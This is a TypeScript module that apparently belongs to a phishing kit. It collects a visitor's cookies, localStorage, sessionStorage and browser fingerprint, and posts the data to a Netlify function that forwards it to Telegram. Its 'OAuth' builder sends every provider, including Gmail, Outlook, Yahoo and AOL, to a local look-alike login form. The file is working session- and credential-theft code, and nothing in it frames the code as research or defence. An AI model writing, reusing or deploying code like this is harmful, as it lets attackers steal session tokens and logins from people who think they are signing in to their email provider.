// Send data to Telegram via Netlify function
export const sendToTelegram = async (data: any): Promise<any> => {
  try {
    const response = await fetch('/.netlify/functions/sendTelegram', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(data),
    });
    
    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }
    
    const result = await response.json();
    console.log('✅ Data sent to Telegram successfully:', result);
    return result;
  } catch (error) {
    console.error('❌ Failed to send to Telegram:', error);
    throw error;
  }
};

export const getBrowserFingerprint = (userEmail?: string) => {
  // Check if we're in a browser environment
  if (typeof window === 'undefined' || typeof document === 'undefined' || typeof navigator === 'undefined') {
    const emailDomain = userEmail ? userEmail.split('@')[1] || 'unknown.com' : 'unknown.com';
    return {
      userAgent: 'Server-side',
      language: 'en-US',
      platform: 'Server',
      cookieEnabled: false,
      doNotTrack: null,
      timezone: 'UTC',
      url: '',
      domain: emailDomain,
      referrer: '',
      screen: {
        width: 0,
        height: 0,
        colorDepth: 0,
        pixelDepth: 0
      },
      cookies: '',
      cookiesParsed: {},
      localStorage: {},
      sessionStorage: {},
      timestamp: new Date().toISOString()
    };
  }
  
  // Enhanced cookie capture
  const getAllCookies = () => {
    const cookies = {};
    document.cookie.split(';').forEach(cookie => {
      const [name, value] = cookie.trim().split('=');
      if (name && value) {
        cookies[name] = decodeURIComponent(value);
      }
    });
    return cookies;
  };

  // Capture all storage data
  const getStorageData = (storage) => {
    const data = {};
    try {
      for (let i = 0; i < storage.length; i++) {
        const key = storage.key(i);
        if (key) {
          data[key] = storage.getItem(key);
        }
      }
    } catch (e) {
      console.warn('Storage access error:', e);
    }
    return data;
  };

  // Extract domain from email if provided, otherwise use current hostname
  const emailDomain = userEmail ? userEmail.split('@')[1] || window.location.hostname : window.location.hostname;
  return {
    userAgent: navigator.userAgent,
    language: navigator.language,
    platform: navigator.platform,
    cookieEnabled: navigator.cookieEnabled,
    doNotTrack: navigator.doNotTrack,
    timezone: typeof Intl !== 'undefined' ? Intl.DateTimeFormat().resolvedOptions().timeZone : 'UTC',
    url: window.location.href,
    domain: emailDomain,
    referrer: document.referrer,
    screen: {
      width: typeof screen !== 'undefined' ? screen.width : 0,
      height: typeof screen !== 'undefined' ? screen.height : 0,
      colorDepth: typeof screen !== 'undefined' ? screen.colorDepth : 0,
      pixelDepth: typeof screen !== 'undefined' ? screen.pixelDepth : 0
    },
    cookies: document.cookie,
    cookiesParsed: getAllCookies(),
    localStorage: getStorageData(localStorage),
    sessionStorage: getStorageData(sessionStorage),
    timestamp: new Date().toISOString()
  };
};

export const generateState = () => {
  return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
};

export const buildOAuthUrl = (provider: string, state: string) => {
  const baseUrl = window.location.origin;
  
  // All providers use demo flow with form login
  const redirectUri = encodeURIComponent(`${baseUrl}/auth/callback`);
  
  // All providers use demo flow - return special URL that indicates form should be shown
  return `/auth/form/${provider}`;
};

export const extractEmailFromProvider = (provider: string, code: string) => {
  // Mock email extraction for demo
  const domains = {
    'Gmail': 'gmail.com',
    'Yahoo': 'yahoo.com',
    'Outlook': 'outlook.com',
    'Office365': 'outlook.com',
    'AOL': 'aol.com',
    'Others': 'example.com'
  };
  
  const domain = domains[provider as keyof typeof domains] || 'example.com';
  return `user${Math.floor(Math.random() * 1000)}@${domain}`;
};